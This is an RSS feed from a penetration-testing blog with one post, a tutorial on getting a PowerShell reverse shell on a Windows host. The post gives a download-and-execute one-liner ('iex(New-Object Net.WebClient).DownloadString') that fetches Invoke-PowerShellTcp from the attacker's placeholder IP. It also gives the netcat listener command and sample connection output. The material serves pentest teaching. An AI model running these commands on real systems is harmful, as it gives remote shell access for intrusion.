<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Andr01d&#39;s Blog</title>
        <link>http://rtandr01d.net/posts/</link>
        <description>Recent content in Posts on Andr01d&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Sun, 05 Jul 2020 20:39:46 -0500</lastBuildDate>
        <atom:link href="http://rtandr01d.net/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Posh Reverse Shell</title>
            <link>http://rtandr01d.net/posts/posh-reverse-shell/</link>
            <pubDate>Sun, 05 Jul 2020 20:39:46 -0500</pubDate>
            
            <guid>http://rtandr01d.net/posts/posh-reverse-shell/</guid>
            <description>When you ware working in a Windows environment, whether Active Directory is involved or not, there will come a time when you need a reverse shell, and most reverse shells from Pentest Monkey arent going to work in your situation. Gaining RCE on a Windows box typically means you have access to either cmd or Powershell. Getting a reliable shell can give some trouble, but luckily, Powershell has the ability to call and run Powershell scripts remotely without dropping anything on disk.</description>
            <content type="html"><![CDATA[<p>When you ware working in a Windows environment, whether Active Directory is involved or not, there will come a time when you need a reverse shell, and most reverse shells from Pentest Monkey arent going to work in your situation. Gaining RCE on a Windows box typically means you have access to either cmd or Powershell. Getting a reliable shell can give some trouble, but luckily, Powershell has the ability to call and run Powershell scripts remotely without dropping anything on disk. First, we need a powershell reverse-tcp script. Luckily, samratashok on github has Invoke-PowerShellTCP.ps1 For this to work well, we need to add a line to the end of the powershell script. For example:</p>

<p>Invoke-PowerShellTcp -Reverse -IPAddress X.X.X.X -Port 4444</p>

<p>where &lsquo;X.X.X.X&rsquo; is the IP address for the reverse shell to connect to. In order for our target machine to be able to grab our Powershell script, we need to start up a webserver. I am partial to using the easy python webserver, so we start it up using:</p>

<p>python -m SimpleHTTPServer 80</p>

<p>We will need a listener on our local machine for the reverse shell to connect back to, so lets start up a netcat listener:</p>

<p>netcat -lnvp 4444</p>

<p>Next, we need to call this powershell script from our RCE on the Windows box. To call this script remotely, we need to run this on the Windows machine:</p>

<p>powershell.exe -exec bypass iex(New-Object Net.WebClient).DownloadString(&lsquo;<a href="http://X.X.X.X/InvokePowerShellTcp.ps1'">http://X.X.X.X/InvokePowerShellTcp.ps1'</a>)</p>

<p>If we are lucky, this will now throw a reverse Powershell instance back to our netcat listener</p>

<p>root@kali:~# nc -lnvp 4444
listening on [any] 4444
connecting to [X.X.X.X] from (UNKNOWN) [X.X.X.X] 47907
Windows PowerShell running as user MS01$ on MS01 Copyright &copy; 2015 Microsoft Corporation. All right reserved.</p>

<p>PS C:</p>
]]></content>
        </item>
        
    </channel>
</rss>
